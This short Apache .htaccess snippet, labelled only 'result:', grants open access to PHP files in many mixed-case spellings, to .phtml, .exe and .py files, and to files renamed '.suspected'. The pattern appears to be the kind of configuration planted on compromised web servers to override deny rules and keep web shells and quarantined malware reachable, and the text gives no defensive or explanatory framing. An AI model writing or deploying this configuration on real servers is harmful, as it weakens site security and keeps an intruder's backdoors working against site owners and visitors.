result:
<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
Order allow,deny
Allow from all
</FilesMatch>

<IfModule !mod_authz_core.c>
    Order Deny,Allow
    Allow from all
</IfModule>

<IfModule mod_authz_core.c>
    Require all granted
</IfModule>
Options -Indexes
